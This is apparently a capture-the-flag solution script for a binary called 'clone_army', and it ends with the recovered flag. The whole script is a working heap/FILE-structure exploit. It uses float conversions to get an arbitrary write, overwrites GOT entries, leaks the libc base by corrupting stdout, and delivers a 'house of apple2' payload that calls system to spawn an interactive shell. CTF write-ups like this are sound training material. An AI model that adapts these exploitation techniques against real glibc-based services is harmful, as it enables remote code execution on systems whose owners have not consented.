#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./clone_army_patched', checksec=False)
libc = ELF("./clone_army-libc.so")

gdbscript = '''
init-pwndbg
# init-gef-bata
b *0x40181A
b *0x401CFA
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def int2float(num: int) -> float:
    return struct.unpack('f', struct.pack('I', num))[0]

def float2int(f: float) -> int:
    return struct.unpack('I', struct.pack('f', f))[0]

# write a dword at clone_army[offset]
def write_dword(offset, value, msg=b'yes'):
    sla(b'unsatisfied with?', b'yes')
    idx, att = divmod(offset, 4)
    match att:
        case 0: # ID
            pass # nothing weird, lucky
        case 1: # height
            value = int2float(value) / 0.3048
        case 2: # weight
            value = int2float(value) / 0.45359999
        case 3: # accuracy
            value = int2float(value) * 100.0
    sla(b'my liege?',str(idx*16).encode())
    sla(b'to change?',str(att+1).encode())
    sla(b'New ', str(value).encode())
    sla(b'Are you satisfied',b'yes')

arb_write = lambda x,y,z=b'yes': write_dword((x-0x403000)//4,y,z)

# ==================== EXPLOIT ====================

while True:
    try:
        p = start()

        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()

        sla(b'ready',b'yes')
        sla(b'Height', b'0.0')
        sla(b'Weight', str(int2float(200) / 0.45359999).encode())
        sla(b'Accuracy', b'5.0')
        sla(b'clones?',b'yes')
        sla(b'clones',b'263079') # first loop (0 -> 263078)
        sla(b'more',b'yes')
        sla(b'clones',b'2147483647') # second loop (263079 -> 2147483646) || NULL[263079] -> NULL[2147483646]
        sla(b'make more',b'no')

        write_dword(2,0xffffffff) # clone count
        write_dword(0,0x403000) # clone_army ptr


        arb_write(exe.got.exit, exe.sym.pwnable_unbuffer_init)

        arb_write(exe.sym.clone_army, 0x403006)

        arb_write(exe.got.realloc,0x3070<<16) # partial overwrite setfbuf -> gets (1/16)

        sla(b'unsatisfied with',b'yes')
        sla(b'my liege',b'1')
        ru(b'soldier with that ID')
        sleep(0.3)
        sl(flat(
            p64(0xfbad3887) + # add _IO_IS_APPENDING flag to stdout
            p64(0)*3 + # read_base, end, and ptr. can be anything
            p8(0) # overwrite LSB of write_base
        )[:-1])

        sleep(0.3)
        sl(flat(
            p64(0xfbad3887) + # add _IO_IS_APPENDING flag to stdout
            p64(0)*3 + # read_base, end, and ptr. can be anything
            p8(0) # overwrite LSB of write_base
        )[:-1])
        libc.address = u64(ru(b'\xff'*8, drop=True)[-16:-8]) - libc.sym._IO_2_1_stdin_
        slog('libc base @ %#x', libc.address)
        break
    except EOFError:
        close()

fp = IO_FILE_plus_struct()
payload = fp.house_of_apple2_execmd_when_exit(
    libc.sym['_IO_2_1_stderr_'],
    libc.sym['_IO_wfile_jumps'],
    libc.sym['system'])

if b'\n' in payload:
    warn('newline in payload D:')

sla(b'to change',b'1')
sla(b'New ', b'2')
sla(b'Are you satisfied',b'yes')
sla(b'unsatisfied with',b'yes')
sla(b'my liege',b'1')
ru(b'soldier with that ID')


sleep(0.3)
sl(b'')
sleep(0.3)
sl(payload)

# pause()

sla(b'to change',b'1')
sla(b'New ', b'2')
sla(b'Are you satisfied',b'yes')
sla(b'unsatisfied with',b'no')

interactive()
# sun{t4k3_th1s_fl4g_my_l13g3}
